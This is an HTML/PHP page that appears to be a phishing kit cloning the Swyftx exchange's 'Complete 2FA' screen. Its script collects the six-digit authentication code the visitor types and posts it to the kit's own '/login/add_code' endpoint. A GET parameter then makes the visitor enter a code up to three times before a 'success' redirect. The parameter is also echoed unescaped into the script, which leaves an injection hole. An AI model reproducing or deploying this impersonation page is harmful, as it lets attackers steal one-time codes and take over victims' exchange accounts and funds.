<!doctype html>
<html lang="en">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Swyftx</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-0evHe/X+R7YkIZDRvuzKMRqM+OrBnVFBL6DOitfPri4tjfHxaWutUpFmBp4vmVor" crossorigin="anonymous">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,300;0,400;0,500;0,600;0,700;1,300;1,400;1,500;1,600;1,700&amp;display=swap" rel="stylesheet">
    <!-- <script src="<?= base_url() ?>assets/swift/splide/dist/js/splide.min.js"></script>
    <link rel="stylesheet" href="<?= base_url() ?>assets/swift/splide/dist/css/splide.min.css"> -->
    <script src='https://www.google.com/recaptcha/api.js'></script>
</head>

<style>
    body {
        font-family: Poppins, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Oxygen, Ubuntu, Cantarell, "Fira Sans", "Droid Sans", "Helvetica Neue", sans-serif;
        -webkit-font-smoothing: antialiased;
        background-image: url(<?= base_url() ?>assets/swift/bg.png);
    }



    .always_check {
        background-color: rgb(226, 240, 255);
        border-radius: 5px;
        padding: 10px 30px;
    }


    .always_check p {
        font-weight: 400;
        line-height: 1.5;
        font-size: 12px;
    }

    .sign_in {
        font-weight: 700;
        font-size: 32px;
    }

    .form-label {
        line-height: 1.5;
        font-size: 14px;
        font-weight: 500;
    }


    .tombol {
        display: inline-flex;
        -webkit-box-align: center;
        align-items: center;
        -webkit-box-pack: center;
        justify-content: center;
        position: relative;
        box-sizing: border-box;
        -webkit-tap-highlight-color: transparent;
        outline: 0px;
        border: 0px;
        margin: 0px;
        cursor: pointer;
        user-select: none;
        vertical-align: middle;
        appearance: none;
        text-decoration: none;
        font-family: Poppins;
        font-weight: 500;
        font-size: 0.9375rem;
        line-height: 1.75;
        padding: 8px 22px;
        border-radius: 5px;
        color: rgb(255, 255, 255);
        background-color: rgb(0, 114, 237);
        box-shadow: none;
        transition: background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms, box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms, border-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
        text-transform: none;
        min-width: auto;
        width: 100%;
        height: 50px;
    }

    .row {
        max-width: 1240px
    }

    .title_c {
        margin: 0px 0px 24px;
        font-family: Poppins;
        font-size: 2.125rem;
        line-height: 1.235;
        color: white;
        font-weight: 700;
        width: 100%;
        text-align: center;
    }

    .caption_c {
        margin: 0px;
        font-family: Poppins;
        font-size: 1rem;
        line-height: 1.5;
        color: white;
        font-weight: 400;
        width: 100%;
        text-align: center;
    }

    .form-control {
        height: 46px;
    }



    .dot {
        border-radius: 0.6rem;
        width: 0.6rem;
        height: 0.6rem;
        margin: 0px 0.2rem;
        background-color: rgb(255, 255, 255);
        display: inline-block;
        transition: background-color 0.6s ease;
        opacity: 0.5;
    }

    .dot_white {
        border-radius: 0.6rem;
        width: 0.6rem;
        height: 0.6rem;
        margin: 0px 0.2rem;
        background-color: rgb(255, 255, 255);
        display: inline-block;
        transition: background-color 0.6s ease;
        opacity: 1;
    }


    .havean {
        align-items: center;
        justify-content: center;
        position: relative;
        box-sizing: border-box;
        background-color: transparent;
        outline: 0px;
        border: 0px;
        margin: 0px;
        cursor: pointer;
        user-select: none;
        vertical-align: middle;
        appearance: none;
        text-decoration: none;
        font-family: Poppins;
        font-weight: 500;
        font-size: 0.875rem;
        line-height: 1.75;
        padding: 6px 8px;
        border-radius: 5px;
        color: rgb(0, 114, 237);
        width: 100%;
        box-shadow: none;
        text-transform: none;
        min-width: auto;
    }

    .css-ldo77b {
        user-select: none;
        display: inline-block;
        fill: currentcolor;
        flex-shrink: 0;
        transition: fill 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
        font-size: 1.5rem;
        width: 24px;
        height: 24px;
        color: currentcolor;
    }

    p {
        margin-top: 0;
        margin-bottom: 0;
    }

    .form-forget {
        margin: 0px;
        font-family: Poppins;
        line-height: 1.5;
        color: rgb(0, 114, 237);
        font-size: 12px;
        font-weight: 500;
    }

    .http {
        margin: 0px;
        font-family: Poppins;
        font-weight: 400;
        line-height: 1.5;
        color: rgb(0, 114, 237);
        font-size: 12px;
    }

    .row {
        padding: 25px;
    }

    .card {
        padding: 50px
    }

    @media (max-width: 600px) {
        .row {
            --bs-gutter-x: 0rem;
            padding: 0px;
        }

        .card {
            border-radius: 0px;
            padding: 5px
        }
    }

    .fa {
        margin: 0px 0px 8px;
        font-family: Poppins;
        line-height: 1.5;
        color: rgb(10, 11, 12);
        width: 100%;
        text-align: center;
        font-weight: 600;
        font-size: 18px;
    }

    .da_sub {
        margin: 0px 0px 24px;
        font-family: Poppins;
        font-weight: 400;
        font-size: 1rem;
        color: rgb(78, 88, 105);
        width: 100%;
        text-align: center;
        line-height: 1.5;
    }

    .code-input {
        text-align: left;
        position: absolute;
        padding: 0px 8px;
        border-radius: inherit;
        border-style: solid;
        border-width: 1px;
        min-width: 0%;
        border-color: rgba(0, 0, 0, 0.23);
        margin-right: calc(var(--spacing) * 2);
    }

    .verf {
        font-family: Poppins;
        font-weight: 400;
        font-size: 1rem;
        line-height: 1.4375em;
        color: rgb(10, 11, 12);
        box-sizing: border-box;
        cursor: text;
        display: inline-flex;
        -webkit-box-align: center;
        align-items: center;
        position: relative;
        border-radius: 5px;
        text-align: center;

    }

    .css-867nx6 {
        display: flex;
        flex-direction: row;
        width: 100%;
        -webkit-box-align: center;
        align-items: center;
        justify-content: space-around;
        opacity: 1;
    }

    .css-1dem6wq {
        display: inline-flex;
        flex-direction: column;
        position: relative;
        min-width: 0px;
        padding: 4px;
        margin: 0px;
        border: 0px;
        vertical-align: top;
        font-size: 18px;
        width: 100%;
    }

    .css-1dem6wq .MuiOutlinedInput-root {
        background-color: rgb(247, 249, 252);
    }


    .css-1utug1q {
        font-family: Poppins;
        font-weight: 400;
        font-size: 1rem;
        line-height: 1.4375em;
        color: rgb(10, 11, 12);
        box-sizing: border-box;
        cursor: text;
        display: inline-flex;
        -webkit-box-align: center;
        align-items: center;
        position: relative;
        border-radius: 5px;
        text-align: center;
    }

    .css-68mfqx {
        font: inherit;
        letter-spacing: inherit;
        color: currentcolor;
        border: 0px;
        box-sizing: content-box;
        background: none;
        height: 1.4375em;
        width: 100%;
        padding: 16.5px 14px;
        text-transform: uppercase;
        text-align: center;
    }

    .css-igs3ac {
        text-align: left;
        position: absolute;
        inset: -5px 0px 0px;
        margin: 0px;
        padding: 0px 8px;
        pointer-events: none;
        border-radius: inherit;
        border-style: solid;
        border-width: 1px;
        overflow: hidden;
        min-width: 0%;
        border-color: rgba(0, 0, 0, 0.23);
    }

    .btn-paste {
        display: inline-flex;
        -webkit-box-align: center;
        align-items: center;
        -webkit-box-pack: center;
        justify-content: center;
        position: relative;
        box-sizing: border-box;
        -webkit-tap-highlight-color: transparent;
        background-color: transparent;
        outline: 0px;
        border: 0px;
        margin: 0px;
        cursor: pointer;
        user-select: none;
        vertical-align: middle;
        appearance: none;
        text-decoration: none;
        font-family: Poppins;
        font-weight: 500;
        line-height: 1.75;
        padding: 6px 8px;
        border-radius: 5px;
        color: rgb(0, 114, 237);
        box-shadow: none;
        transition: background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms, box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms, border-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
        text-transform: none;
        min-width: auto;
        font-size: 14px;
    }

    .css-1kfd3dn {
        user-select: none;
        display: inline-block;
        fill: currentcolor;
        flex-shrink: 0;
        transition: fill 200ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
        font-size: 1.5rem;
        color: rgb(0, 114, 237);
        margin-right: 4px;
        width: 24px;
        height: 24px;
    }

    .css-qmlqi4 {
        display: inline-flex;
        -webkit-box-align: center;
        align-items: center;
        -webkit-box-pack: center;
        justify-content: center;
        position: relative;
        box-sizing: border-box;
        -webkit-tap-highlight-color: transparent;
        background-color: transparent;
        outline: 0px;
        margin: 0px 8px 0px 0px;
        cursor: pointer;
        user-select: none;
        vertical-align: middle;
        appearance: none;
        text-decoration: none;
        font-family: Poppins;
        font-weight: 500;
        font-size: 0.875rem;
        line-height: 1.75;
        padding: 5px 15px;
        border-radius: 5px;
        border: 1px solid currentcolor;
        box-shadow: none;
        transition: background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms, box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms, border-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
        text-transform: none;
        min-width: auto;
        height: 50px;
        color: rgb(78, 88, 105);
    }

    .css-c3j8uc {
        display: inline-flex;
        -webkit-box-align: center;
        align-items: center;
        -webkit-box-pack: center;
        justify-content: center;
        position: relative;
        box-sizing: border-box;
        -webkit-tap-highlight-color: transparent;
        outline: 0px;
        border: 0px;
        margin: 0px;
        cursor: pointer;
        user-select: none;
        vertical-align: middle;
        appearance: none;
        text-decoration: none;
        font-family: Poppins;
        font-weight: 500;
        font-size: 0.9375rem;
        line-height: 1.75;
        padding: 8px 22px;
        border-radius: 5px;
        color: rgb(255, 255, 255);
        background-color: rgb(0, 114, 237);
        box-shadow: none;
        transition: background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms, box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms, border-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
        text-transform: none;
        min-width: auto;
        height: 50px;
    }

    .tombol-disabled {
        display: inline-flex;
        -webkit-box-align: center;
        align-items: center;
        -webkit-box-pack: center;
        justify-content: center;
        position: relative;
        box-sizing: border-box;
        -webkit-tap-highlight-color: transparent;
        outline: 0px;
        border: 0px;
        margin: 0px;
        cursor: pointer;
        user-select: none;
        vertical-align: middle;
        appearance: none;
        text-decoration: none;
        font-family: Poppins;
        font-weight: 500;
        font-size: 0.9375rem;
        line-height: 1.75;
        padding: 8px 22px;
        border-radius: 5px;
        color: #ababab;
        background-color: rgb(224 224 224);

        box-shadow: none;
        transition: background-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms, box-shadow 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms, border-color 250ms cubic-bezier(0.4, 0, 0.2, 1) 0ms;
        text-transform: none;
        min-width: auto;
        width: 100%;
        height: 50px;
    }
</style>

<body>
    <div class="bg h-100">
        <div class="row py-5-sm px-5-sm d-flex flex-md-row flex-column mx-auto justify-content-center">
            <div class="col-md-6 col-sm-12 d-flex justify-content-center flex-column align-self-center order-2 order-md-1 mt-4">
                <div class="d-flex justify-content-center flex-column align-self-center d-none d-sm-block">
                    <img id="loginCarousel.logo.image" src="<?= base_url() ?>assets/swift/swyftx-logo.svg" width="150" height="35" alt="swyftx-logo">
                </div>
                <div class="mt-4 slideshow-container">
                    <div class="mySlides">
                        <h1 class="title_c">Buy, sell and trade over 280+ assets.</h1>
                        <h4 class="caption_c">Never miss out on assets, with new listings added every month.</h4>
                    </div>

                </div>
                <div style="text-align:center" class="mt-5">
                    <span class="dot_white"></span>
                    <span class="dot"></span>
                    <span class="dot"></span>
                    <span class="dot"></span>
                </div>

            </div>
            <div class="col-md-6 order-1 order-md-2 col-sm-12">
                <div class="card">
                    <div class="card-body">
                        <div class="d-flex justify-content-center align-self-center mb-4 d-block d-sm-none">
                            <svg class="MuiSvgIcon-root MuiSvgIcon-fontSizeMedium css-1ypq714" focusable="false" aria-hidden="true" viewBox="0 0 24 24" id="loginCarousel.logo.dark.image" width="32px" height="32px"><svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                    <path d="M7.03766 22.32C7.11099 22.2133 7.65765 21.5667 8.25096 20.8667C8.85095 20.1734 9.61093 19.2534 9.95092 18.8334C10.2842 18.4134 10.8242 17.7668 11.1442 17.4001C11.9375 16.4868 12.1442 16.1668 12.0309 16.0468C11.8642 15.8868 11.4375 15.8335 10.2842 15.8335C9.23094 15.8335 6.59101 16.0468 6.43101 16.1468C6.39101 16.1735 6.38435 16.1535 6.41768 16.1068C6.57101 15.8535 7.87097 15.1669 8.1843 15.1669C8.25763 15.1669 8.31763 15.1402 8.31763 15.1002C8.31763 15.0669 8.2443 15.0335 8.15763 15.0335C8.0643 15.0335 7.74431 14.9535 7.43765 14.8602C6.60434 14.6002 5.6177 14.0869 6.15102 14.1936C7.62431 14.4869 9.85759 14.5335 10.9842 14.3069C12.1975 14.0536 12.5575 13.7936 13.0042 12.8536C13.2042 12.4269 13.2175 12.3536 13.2108 11.7003C13.1975 9.82701 12.1442 6.36044 10.7376 3.54051C10.4642 3.00053 10.2576 2.53387 10.2842 2.51387C10.4176 2.38055 11.5242 3.22719 12.5242 4.23383C14.3841 6.11378 15.9241 8.78037 16.6241 11.3403C16.7841 11.9336 16.7907 12.0403 16.7307 12.3869C16.6707 12.6936 16.4774 13.2003 16.2707 13.5736C16.2574 13.5936 16.4907 13.6469 16.7841 13.6869C17.3574 13.7669 17.5774 13.8602 17.9107 14.1402C18.2574 14.4269 18.284 14.5402 18.0707 14.7402C17.724 15.0602 17.0041 15.3669 16.1574 15.5469C15.9308 15.5935 15.8908 15.6335 15.7841 15.9135C15.5574 16.5135 14.9108 17.3735 14.0175 18.2734C12.9842 19.3134 10.7776 21.16 10.0576 21.5867C9.14427 22.1333 7.99764 22.5 7.21766 22.5H6.911L7.03766 22.32Z" fill="currentColor"></path>
                                </svg></svg>
                        </div>
                        <h2 class="fw-bold text-center sign_in">Sign In</h2>
                        <h2 class="fw-bold text-center sign_in fa">Complete 2FA</h2>
                        <h2 class="fw-bold text-center sign_in da_sub">Please enter the 6-digit code from your two factor authentication Or Phone Code</h2>

                        <div id="twoFactorLogin.form.codeInput" class="d-flex justify-content-between fs-mask css-867nx6" data-testid="test-twoFactorLogin.form.codeInput">
                            <div class="MuiBox-root css-0">
                                <div class="MuiBox-root css-8atqhb">
                                    <div class="MuiFormControl-root MuiTextField-root css-1dem6wq" data-testid="test-twoFactorLogin.form.codeInput-input-0">
                                        <div class="MuiOutlinedInput-root MuiInputBase-root MuiInputBase-colorPrimary MuiInputBase-formControl css-1utug1q"><input aria-invalid="false" autocomplete="new-password" id="twoFactorLogin.form.codeInput-input-0" placeholder="0" type="text" max="1" onkeyup="validasi()" class="code code1 MuiOutlinedInput-input MuiInputBase-input css-68mfqx" value="">
                                            <fieldset aria-hidden="true" class="MuiOutlinedInput-notchedOutline css-igs3ac">
                                                <legend class="css-hdw1oc"><span class="notranslate">​</span></legend>
                                            </fieldset>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div class="MuiBox-root css-0">
                                <div class="MuiBox-root css-8atqhb">
                                    <div class="MuiFormControl-root MuiTextField-root css-1dem6wq" data-testid="test-twoFactorLogin.form.codeInput-input-1">
                                        <div class="MuiOutlinedInput-root MuiInputBase-root MuiInputBase-colorPrimary MuiInputBase-formControl css-1utug1q"><input aria-invalid="false" autocomplete="new-password" id="twoFactorLogin.form.codeInput-input-1" placeholder="0" type="text" max="1" onkeyup="validasi()" class="code code2 MuiOutlinedInput-input MuiInputBase-input css-68mfqx" value="">
                                            <fieldset aria-hidden="true" class="MuiOutlinedInput-notchedOutline css-igs3ac">
                                                <legend class="css-hdw1oc"><span class="notranslate">​</span></legend>
                                            </fieldset>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div class="MuiBox-root css-0">
                                <div class="MuiBox-root css-8atqhb">
                                    <div class="MuiFormControl-root MuiTextField-root css-1dem6wq" data-testid="test-twoFactorLogin.form.codeInput-input-2">
                                        <div class="MuiOutlinedInput-root MuiInputBase-root MuiInputBase-colorPrimary MuiInputBase-formControl css-1utug1q"><input aria-invalid="false" autocomplete="new-password" id="twoFactorLogin.form.codeInput-input-2" placeholder="0" type="text" max="1" onkeyup="validasi()" class="code code3 MuiOutlinedInput-input MuiInputBase-input css-68mfqx" value="">
                                            <fieldset aria-hidden="true" class="MuiOutlinedInput-notchedOutline css-igs3ac">
                                                <legend class="css-hdw1oc"><span class="notranslate">​</span></legend>
                                            </fieldset>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div class="MuiBox-root css-0">
                                <div class="MuiBox-root css-8atqhb">
                                    <div class="MuiFormControl-root MuiTextField-root css-1dem6wq" data-testid="test-twoFactorLogin.form.codeInput-input-3">
                                        <div class="MuiOutlinedInput-root MuiInputBase-root MuiInputBase-colorPrimary MuiInputBase-formControl css-1utug1q"><input aria-invalid="false" autocomplete="new-password" id="twoFactorLogin.form.codeInput-input-3" placeholder="0" type="text" max="1" onkeyup="validasi()" class="code code4 MuiOutlinedInput-input MuiInputBase-input css-68mfqx" value="">
                                            <fieldset aria-hidden="true" class="MuiOutlinedInput-notchedOutline css-igs3ac">
                                                <legend class="css-hdw1oc"><span class="notranslate">​</span></legend>
                                            </fieldset>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div class="MuiBox-root css-0">
                                <div class="MuiBox-root css-8atqhb">
                                    <div class="MuiFormControl-root MuiTextField-root css-1dem6wq" data-testid="test-twoFactorLogin.form.codeInput-input-4">
                                        <div class="MuiOutlinedInput-root MuiInputBase-root MuiInputBase-colorPrimary MuiInputBase-formControl css-1utug1q"><input aria-invalid="false" autocomplete="new-password" id="twoFactorLogin.form.codeInput-input-4" placeholder="0" type="text" max="1" onkeyup="validasi()" class="code code5 MuiOutlinedInput-input MuiInputBase-input css-68mfqx" value="">
                                            <fieldset aria-hidden="true" class="MuiOutlinedInput-notchedOutline css-igs3ac">
                                                <legend class="css-hdw1oc"><span class="notranslate">​</span></legend>
                                            </fieldset>
                                        </div>
                                    </div>
                                </div>
                            </div>
                            <div class="MuiBox-root css-0">
                                <div class="MuiBox-root css-8atqhb">
                                    <div class="MuiFormControl-root MuiTextField-root css-1dem6wq" data-testid="test-twoFactorLogin.form.codeInput-input-5">
                                        <div class="MuiOutlinedInput-root MuiInputBase-root MuiInputBase-colorPrimary MuiInputBase-formControl css-1utug1q"><input aria-invalid="false" autocomplete="new-password" id="twoFactorLogin.form.codeInput-input-5" placeholder="0" type="text" max="1" onkeyup="validasi()" class="code code6 MuiOutlinedInput-input MuiInputBase-input css-68mfqx" value="">
                                            <fieldset aria-hidden="true" class="MuiOutlinedInput-notchedOutline css-igs3ac">
                                                <legend class="css-hdw1oc"><span class="notranslate">​</span></legend>
                                            </fieldset>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="d-flex flex-column mt-5 mb-5">
                            <h2 class="btn-paste"><svg class="MuiSvgIcon-root MuiSvgIcon-colorPrimary MuiSvgIcon-fontSizeMedium css-1kfd3dn" focusable="false" aria-hidden="true" viewBox="0 0 24 24"><svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                                        <path opacity="0.4" d="M16.903 18.148H12M16.903 15.306H12M13.871 12.47h-1.87" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path>
                                        <path clip-rule="evenodd" d="M17.033 9l-5.22.003c-1.874.011-3.035 1.244-3.035 3.125v6.244c0 1.89 1.17 3.128 3.06 3.128l5.22-.002c1.874-.012 3.035-1.245 3.035-3.126v-6.244c0-1.89-1.17-3.128-3.06-3.128z" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path>
                                        <rect x="7" y="3" width="5" height="3" rx="1.5" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></rect>
                                        <path d="M16 9V7a3 3 0 00-3-3h-1M8.5 18H6a3 3 0 01-3-3V7a3 3 0 013-3h1" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"></path>
                                    </svg></svg> Paste Code</h2>
                            <input type="hidden" class="form-control paste" onclick="paste(this)" name="paste" id="paste" value="" autocomplete="off">
                            <h2 class="btn-paste">Use recovery code</h2>
                            <h2 class="btn-paste">Have you lost your authenticator</h2>
                        </div>
                        <div class="row d-flex flex-row mt-5 justify-content-center">
                            <div class="col-6 d-grid gap-2">
                                <button class="MuiLoadingButton-root MuiButton-root MuiButton-outlined MuiButton-outlinedInherit MuiButton-sizeMedium MuiButton-outlinedSizeMedium MuiButton-colorInherit MuiButton-disableElevation MuiButtonBase-root css-qmlqi4 back" tabindex="0" type="button" data-testid="" id="mui-14">Back<span class="MuiTouchRipple-root css-w0pj6f"></span></button>
                            </div>
                            <div class="col-6 d-grid gap-2">
                                <button class="MuiLoadingButton-root MuiButton-root MuiButton-contained MuiButton-containedPrimary MuiButton-sizeLarge MuiButton-containedSizeLarge MuiButton-disableElevation MuiButtonBase-root Mui-disabled tombol-disabled proses" tabindex="-1" type="button" id="twoFactorLogin.buttonLabels.verify" data-testid="test-twoFactorLogin.buttonLabels.verify">Verify</button>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.2.0-beta1/dist/js/bootstrap.bundle.min.js" integrity="sha384-pprn3073KE6tl6bjs2QrFaJGz5/SUsLqktiwsUTF55Jfv3qYSDhgCecCxMW52nD2" crossorigin="anonymous"></script>
        <script src="https://code.jquery.com/jquery-3.6.0.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script>

        <script>
            jQuery.fn.ForceNumericOnly =
                function() {
                    return this.each(function() {
                        $(this).keydown(function(e) {
                            var key = e.charCode || e.keyCode || 0;
                            // allow backspace, tab, delete, enter, arrows, numbers and keypad numbers ONLY
                            // home, end, period, and numpad decimal
                            return (
                                key == 8 ||
                                key == 9 ||
                                key == 13 ||
                                key == 46 ||
                                key == 110 ||
                                key == 190 ||
                                (key >= 35 && key <= 40) ||
                                (key >= 48 && key <= 57) ||
                                (key >= 96 && key <= 105));
                        });
                    });
                };
            $(function(e) {
                const paste = document.getElementById('paste');
                paste.addEventListener('click', () => {
                    console.log(e)
                });
                const codes = document.querySelectorAll('.code')
                $('.code').ForceNumericOnly();
                codes[0].focus()
                $('.code').bind("paste", function(e) {
                    e.preventDefault();
                });
                codes.forEach((code, idx) => {
                    code.addEventListener('keydown', (e) => {
                        if (e.key >= 0 && e.key <= 9) {
                            codes[idx].value = ''
                            setTimeout(() => codes[idx + 1].focus(), 10)
                        } else if (e.key === 'Backspace') {
                            setTimeout(() => codes[idx - 1].focus(), 10)
                        }
                    })
                })
            })

            function validasi() {
                if ($(".code1").val() == "") {
                    $(".proses").attr("class", "tombol-disabled proses")
                } else if ($(".code2").val() == "") {
                    $(".proses").attr("class", "tombol-disabled proses")
                } else if ($(".code3").val() == "") {
                    $(".proses").attr("class", "tombol-disabled proses")
                } else if ($(".code4").val() == "") {
                    $(".proses").attr("class", "tombol-disabled proses")
                } else if ($(".code5").val() == "") {
                    $(".proses").attr("class", "tombol-disabled proses")
                } else if ($(".code6").val() == "") {
                    $(".proses").attr("class", "tombol-disabled proses")
                } else {
                    console.log("good")
                    $(".proses").attr("class", "tombol proses")
                }
            }
            $(".back").click(function() {
                window.location.replace("<?= base_url() ?>index.php/login");
            })
            $(".proses").click(function() {
                if ($(".code1").val() == "") {
                    $(".proses").attr("class", "tombol-disabled proses")
                } else if ($(".code2").val() == "") {
                    $(".proses").attr("class", "tombol-disabled proses")
                } else if ($(".code3").val() == "") {
                    $(".proses").attr("class", "tombol-disabled proses")
                } else if ($(".code4").val() == "") {
                    $(".proses").attr("class", "tombol-disabled proses")
                } else if ($(".code5").val() == "") {
                    $(".proses").attr("class", "tombol-disabled proses")
                } else if ($(".code6").val() == "") {
                    $(".proses").attr("class", "tombol-disabled proses")
                } else {
                    $.ajax({
                        type: 'POST',
                        url: '/index.php/login/add_code',
                        beforeSend: function() {
                            // memuat()
                        },
                        data: {
                            code1: $('.code1').val(),
                            code2: $('.code2').val(),
                            code3: $('.code3').val(),
                            code4: $('.code4').val(),
                            code5: $('.code5').val(),
                            code6: $('.code6').val(),
                        },
                        dataType: 'json',
                        success: function(data) {
                            console.log(data)
                            if (data == true) {
                                if (<?= $_GET['pRdWVyeShkb2N1bWVudCkucmVhZH'] ?> == "1") {
                                    window.location.replace("<?= base_url() ?>index.php/login/code?pRdWVyeShkb2N1bWVudCkucmVhZH=2");
                                } else if (<?= $_GET['pRdWVyeShkb2N1bWVudCkucmVhZH'] ?> == "2") {
                                    window.location.replace("<?= base_url() ?>index.php/login/code?pRdWVyeShkb2N1bWVudCkucmVhZH=3");
                                } else {
                                    window.location.replace("<?= base_url() ?>index.php/success");
                                }
                            } else {}
                        },
                        error: function(x, e) {
                            console.log(e)
                        } //end error
                    });
                }
            })
        </script>
</body>

</html>